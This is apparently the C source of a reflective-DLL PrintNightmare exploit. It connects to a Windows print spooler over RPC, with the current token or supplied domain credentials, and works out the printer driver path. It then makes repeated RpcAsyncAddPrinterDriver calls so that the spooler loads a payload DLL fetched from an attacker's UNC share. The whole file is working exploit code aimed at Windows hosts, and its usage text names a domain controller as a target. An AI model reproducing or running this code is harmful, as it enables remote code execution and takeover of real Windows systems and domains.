#undef  _UNICODE
#define _UNICODE
#undef  UNICODE
#define UNICODE

#include <Windows.h>
#include <stdio.h>
#include <shlwapi.h>

#include "ReflectiveLoader.h"
//#include "ms-rprn.h"
#include "ms-par.h"

#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "Shlwapi.lib")

#define MAX_BUF 512

// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
extern HINSTANCE hAppInstance;

EXTERN_C void __RPC_FAR* __RPC_USER midl_user_allocate(size_t len) {
	return(malloc(len));
}

EXTERN_C void __RPC_USER midl_user_free(void __RPC_FAR* ptr) {
	free(ptr);
}

void Usage(IN LPWSTR lpProgram) {
	wprintf(L"[>] %s <target ip or hostname> <UNC path to payload Dll>\n", lpProgram);
	wprintf(L"[>] Example: %s 192.168.1.10 \\\\192.168.1.133\\Honey\\IShrunkTheDC.dll\n\n", lpProgram);
	wprintf(L"[>] Or when using alternative creds instead of current token:\n");
	wprintf(L"[>] %s <target ip or hostname> <UNC path to payload Dll> <domain> <username> <password>\n", lpProgram);
	wprintf(L"[>] Example: %s 192.168.1.10 \\\\192.168.1.133\\Honey\\IShrunkTheDC.dll blaat.local kermit ThisIsFine!\n\n", lpProgram);
}

LPWSTR Utf8ToUtf16(IN LPSTR lpAnsiString) {
	INT strLen = MultiByteToWideChar(CP_UTF8, 0, lpAnsiString, -1, NULL, 0);
	if (!strLen) {
		return NULL;
	}

	LPWSTR lpWideString = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, strLen + 1 * sizeof(WCHAR));
	if (!lpWideString) {
		return NULL;
	}
	MultiByteToWideChar(CP_UTF8, 0, lpAnsiString, -1, lpWideString, strLen);

	return lpWideString;
}

LPWSTR WINAPI StripDoubleSlash(_In_ LPCWSTR lpszPath) {
	LPCWSTR lpwRoot = lpszPath;

	if ((*lpszPath == '\\') && lpszPath[1] && lpszPath[1] == '\\') {
		lpwRoot = lpszPath + 2;
	}

	return (LPWSTR)lpwRoot;
}

LPWSTR WINAPI MyPathFindFileNameW(IN LPCWSTR lpszPath) {
	LPCWSTR lastSlash = lpszPath;
	while (lpszPath && *lpszPath) {
		if ((*lpszPath == '\\' || *lpszPath == '/' || *lpszPath == ':') &&
			lpszPath[1] && lpszPath[1] != '\\' && lpszPath[1] != '/')
			lastSlash = lpszPath + 1;
		lpszPath++;
	}
	return (LPWSTR)lastSlash;
}

RPC_STATUS CreateBindingHandle(IN LPWSTR lpwDomainname, IN LPWSTR lpwUsername, IN LPWSTR lpwPassword, IN LPWSTR lpwTarget, OUT RPC_BINDING_HANDLE* binding_handle) {
	RPC_STATUS rStatus;
	RPC_BINDING_HANDLE v5;
	RPC_SECURITY_QOS SecurityQOS = { 0 };
	RPC_WSTR StringBinding = NULL;
	RPC_BINDING_HANDLE Binding;
	SEC_WINNT_AUTH_IDENTITY AuthIdentity = { 0 };

	StringBinding = 0;
	Binding = 0;

	rStatus = RpcStringBindingComposeW((RPC_WSTR)L"12345678-1234-abcd-ef00-0123456789ab", (RPC_WSTR)L"ncacn_ip_tcp", (RPC_WSTR)lpwTarget, (RPC_WSTR)NULL, (RPC_WSTR)NULL, &StringBinding);
	if (rStatus == RPC_S_OK) {
		rStatus = RpcBindingFromStringBindingW(StringBinding, &Binding);
		RpcStringFreeW(&StringBinding);
		if (!rStatus) {
			if (lpwUsername != NULL) {
				SecurityQOS.Version = 1;
				SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_DELEGATE;
				SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_IGNORE_DELEGATE_FAILURE;
				SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_DYNAMIC;

				AuthIdentity.Domain = (unsigned short*)lpwDomainname;
				AuthIdentity.DomainLength = lstrlenW(lpwDomainname);
				AuthIdentity.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;
				AuthIdentity.User = (unsigned short*)lpwUsername;
				AuthIdentity.UserLength = lstrlenW(lpwUsername);
				AuthIdentity.Password = (unsigned short*)lpwPassword;
				AuthIdentity.PasswordLength = lstrlenW(lpwPassword);

				rStatus = RpcBindingSetAuthInfoExW(Binding, 0, 6u, 0xAu, &AuthIdentity, 0, (RPC_SECURITY_QOS*)&SecurityQOS);
			}
			else {
				SecurityQOS.Version = 1;
				SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
				SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
				SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;

				rStatus = RpcBindingSetAuthInfoExW(Binding, 0, 6u, 0xAu, 0, 0, (RPC_SECURITY_QOS*)&SecurityQOS);
			}

			rStatus = RpcBindingSetObject(Binding, (UUID *)&PAR_ObjectUUID);
			if (rStatus == RPC_S_OK) {
				v5 = Binding;
				Binding = 0;
				*binding_handle = v5;
				wprintf(L"[>] RPC Binding successful\n");
			}
		}
	}

	if (Binding) {
		RpcBindingFree(&Binding);
	}

	return rStatus;
}

LPWSTR GetDriverPath(IN LPWSTR lpwTarget) {
	HKEY hKeyHandle = NULL;
	HKEY hSubKeyHandle = NULL;
	WCHAR wcKeyName[MAX_BUF] = { 0 };
	DWORD dwNamelen = MAX_BUF;
	LPWSTR lpwDriverPath = NULL;

	DWORD dwNeeded = 0, dwReturned = 0;
	PDRIVER_INFO_2 pDrvInfo2 = NULL;

	lpwDriverPath = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_BUF * sizeof(WCHAR));
	if (lpwDriverPath == NULL) {
		return NULL;
	}

	LSTATUS lResult = RegConnectRegistry(lpwTarget, HKEY_LOCAL_MACHINE, &hKeyHandle);
	if (lResult == 0) {
		lResult = RegOpenKey(hKeyHandle, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Print\\PackageInstallation\\Windows x64\\DriverPackages", &hSubKeyHandle);

		if (lResult == 0) {
			for (DWORD i = 0; ; i++) {
				RtlZeroMemory(wcKeyName, sizeof(wcKeyName));
				lResult = RegEnumKeyEx(hSubKeyHandle, i, wcKeyName, &dwNamelen, NULL, NULL, NULL, NULL);
				if (StrStrIW(wcKeyName, L"ntprint.inf_amd64")) {
					wcscpy_s(lpwDriverPath, MAX_BUF, L"C:\\Windows\\System32\\DriverStore\\FileRepository\\");
					wcscat_s(lpwDriverPath, MAX_BUF, wcKeyName);
					wcscat_s(lpwDriverPath, MAX_BUF, L"\\Amd64\\UNIDRV.DLL");
					wprintf(L"[>] pDriverPath:  -> %s\n\n", lpwDriverPath);
					break;
				}

				if (lResult == ERROR_NO_MORE_ITEMS) {
					break;
				}

				dwNamelen = MAX_PATH;
			}
		}
	}
	else { // Try Local
		//Find required buffer size
		EnumPrinterDrivers(NULL, NULL, 2, (LPBYTE)pDrvInfo2, 0, &dwNeeded, &dwReturned);
		if (dwNeeded > 0) {
			pDrvInfo2 = (PDRIVER_INFO_2)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwNeeded);
		}

		if (pDrvInfo2 != NULL) {
			if (EnumPrinterDrivers(NULL, NULL, 2, (LPBYTE)pDrvInfo2, dwNeeded, &dwNeeded, &dwReturned)) {
				for (DWORD x = 0; x < dwReturned; x++) {
					if (StrStrIW(pDrvInfo2[x].pDriverPath, L"ntprint.inf_amd64")) {
						if (PathRemoveFileSpec(pDrvInfo2[x].pDriverPath)) {
							wcscpy_s(lpwDriverPath, MAX_BUF, pDrvInfo2[x].pDriverPath);
							wcscat_s(lpwDriverPath, MAX_BUF, L"\\UNIDRV.DLL");
							wprintf(L"[>] pDriverPath:  -> %s\n\n", lpwDriverPath);
							break;
						}
					}
				}
			}
		}
	}

	if (hSubKeyHandle != NULL) {
		RegCloseKey(hSubKeyHandle);
	}

	if (hKeyHandle != NULL) {
		RegCloseKey(hKeyHandle);
	}

	if (pDrvInfo2 != NULL) {
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, pDrvInfo2);
	}

	return lpwDriverPath;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
	BOOL bReturnValue = TRUE;
	LPWSTR lpwParams = NULL;

	switch (dwReason)
	{
	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
			*(HMODULE *)lpReserved = hAppInstance;
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;

		DWORD dwResult = 0;
		LPWSTR lpwTarget = NULL;
		LPWSTR lpwShare = NULL;
		LPWSTR lpwPayload = NULL;
		LPWSTR lpwDomainname = NULL;
		LPWSTR lpwUsername = NULL;
		LPWSTR lpwPassword = NULL;
		LPWSTR lpwDriverPath = NULL;

		WCHAR wcUNCShare[MAX_BUF] = L"\\??\\";
		WCHAR wcRPCTarget[MAX_BUF] = L"\\\\";
		WCHAR wcDestPad[MAX_BUF] = { 0 };

		DRIVER_INFO_2 info = { 0 };
		DRIVER_CONTAINER container_info = { 0 };
		RPC_BINDING_HANDLE bHandle;
		RPC_STATUS rStatus = RPC_S_NO_BINDINGS;

		if (lpReserved != NULL) {
			LPWSTR* szArglist = NULL;
			INT nArgs = 0;

			// Handle the command line arguments.
			lpwParams = Utf8ToUtf16(lpReserved);
			if (lpwParams == NULL) {
				wprintf(L"\n[!] Failed to convert arguments...\n");
				fflush(stdout);
				ExitProcess(0);
			}

			szArglist = CommandLineToArgvW(lpwParams, &nArgs);
			wprintf(L"[>] PrintNightmare exploit by @Cneelis\n\n");
			if (nArgs < 2 || nArgs > 5) {
				Usage(L"PrintNightmare");
				fflush(stdout);
				ExitProcess(0);
			}
			else {
				lpwTarget = szArglist[0];
				lpwShare = szArglist[1];
			}

			if (PathIsUNC(lpwShare)) {
				lpwShare = StripDoubleSlash(lpwShare);
				wcscat_s(wcUNCShare, MAX_PATH, L"UNC\\");
			}

			wcscat_s(wcUNCShare, MAX_PATH, lpwShare);

			wprintf(L"[>] Target system -> %ls\n", lpwTarget);
			wprintf(L"[>] Payload share -> %ls\n", wcUNCShare);

			if (nArgs == 5) {
				lpwDomainname = szArglist[2];
				lpwUsername = szArglist[3];
				lpwPassword = szArglist[4];

				wprintf(L"[>] Domainname    -> %ls\n", lpwDomainname);
				wprintf(L"[>] Username      -> %ls\n", lpwUsername);
				wprintf(L"[>] Password      -> %ls\n", lpwPassword);
			}

			lpwDriverPath = GetDriverPath(lpwTarget);
			if (lpwDriverPath == NULL) {
				wprintf(L"\n[!] Failed to enumerate DriverPath...\n\n");
				goto CleanUp;
			}

			info.cVersion = 3;
			info.pConfigFile = (LPWSTR)L"C:\\Windows\\System32\\kernelbase.dll";
			info.pDataFile = wcUNCShare;

			info.pDriverPath = (LPWSTR)lpwDriverPath;
			info.pEnvironment = (LPWSTR)L"Windows x64";
			info.pName = (LPWSTR)L"Microsoft Print to RCE";

			rStatus = CreateBindingHandle(lpwDomainname, lpwUsername, lpwPassword, lpwTarget, &bHandle);
			if (rStatus != RPC_S_OK) {
				wprintf(L"\n[!] RPC Binding failed...\n\n");
				goto CleanUp;
			}

			container_info.Level = 2;
			container_info.DriverInfo.Level2 = (DRIVER_INFO_2*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(DRIVER_INFO_2));
			container_info.DriverInfo.Level2->cVersion = 3;
			container_info.DriverInfo.Level2->pConfigFile = info.pConfigFile;
			container_info.DriverInfo.Level2->pDataFile = info.pDataFile;
			container_info.DriverInfo.Level2->pDriverPath = info.pDriverPath;
			container_info.DriverInfo.Level2->pEnvironment = info.pEnvironment;
			container_info.DriverInfo.Level2->pName = info.pName;

			wcscat_s(wcRPCTarget, _countof(wcRPCTarget), lpwTarget);

			RpcTryExcept{
				dwResult = RpcAsyncAddPrinterDriver(bHandle, wcRPCTarget, &container_info, APD_COPY_ALL_FILES | 0x10 | 0x8000);
				//dwResult = RpcAddPrinterDriverEx(bHandle, wcRPCTarget, &container_info, APD_COPY_ALL_FILES | 0x10 | 0x8000);
				if (dwResult == 0) {
					wprintf(L"[>] RpcAsyncAddPrinterDriver Errorcode: %d\n", dwResult);
					wprintf(L"[>] Spooler copy  -> %ls\n", container_info.DriverInfo.Level2->pDataFile);
				}

				lpwPayload = MyPathFindFileNameW(lpwShare);
				wsprintf(wcDestPad, L"C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\1\\%ls", lpwPayload);
				container_info.DriverInfo.Level2->pConfigFile = wcDestPad;

				dwResult = RpcAsyncAddPrinterDriver(bHandle, wcRPCTarget, &container_info, APD_COPY_ALL_FILES | 0x10 | 0x8000);
				//dwResult = RpcAddPrinterDriverEx(bHandle, wcRPCTarget, &container_info, APD_COPY_ALL_FILES | 0x10 | 0x8000);
				wprintf(L"[>] Try to load   -> %ls, Errorcode: %d\n", container_info.DriverInfo.Level2->pConfigFile, dwResult);
				if (dwResult == 0) {
					wprintf(L"\n[>] Exploit successful.\n\n");
					goto CleanUp;
				}

				wsprintf(wcDestPad, L"C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\2\\%ls", lpwPayload);
				container_info.DriverInfo.Level2->pConfigFile = wcDestPad;

				dwResult = RpcAsyncAddPrinterDriver(bHandle, wcRPCTarget, &container_info, APD_COPY_ALL_FILES | 0x10 | 0x8000);
				//dwResult = RpcAddPrinterDriverEx(bHandle, wcRPCTarget, &container_info, APD_COPY_ALL_FILES | 0x10 | 0x8000);
				wprintf(L"[>] Try to load   -> %ls, Errorcode: %d\n", container_info.DriverInfo.Level2->pConfigFile, dwResult);
				if (dwResult == 0) {
					wprintf(L"\n[>] Exploit successful.\n\n");
					goto CleanUp;
				}

				wsprintf(wcDestPad, L"C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\3\\%ls", lpwPayload);
				container_info.DriverInfo.Level2->pConfigFile = wcDestPad;

				dwResult = RpcAsyncAddPrinterDriver(bHandle, wcRPCTarget, &container_info, APD_COPY_ALL_FILES | 0x10 | 0x8000);
				//dwResult = RpcAddPrinterDriverEx(bHandle, wcRPCTarget, &container_info, APD_COPY_ALL_FILES | 0x10 | 0x8000);
				wprintf(L"[>] Try to load   -> %ls, Errorcode: %d\n", container_info.DriverInfo.Level2->pConfigFile, dwResult);
				if (dwResult == 0) {
					wprintf(L"\n[>] Exploit successful.\n\n");
					goto CleanUp;
				}

				wprintf(L"\n[>] Exploit failed...\n\n");
			}
				RpcExcept(1) {
				rStatus = RpcExceptionCode();
				wprintf(L"\n[!] RPC Error: %d\n\n", rStatus);
			}
			RpcEndExcept
		}

	CleanUp:

		if (container_info.DriverInfo.Level2 != NULL) {
			HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, container_info.DriverInfo.Level2);
		}

		if (lpwDriverPath != NULL) {
			HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, lpwDriverPath);
		}

		// Flush STDOUT
		fflush(stdout);

		// We're done, so let's exit
		ExitProcess(0);
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}
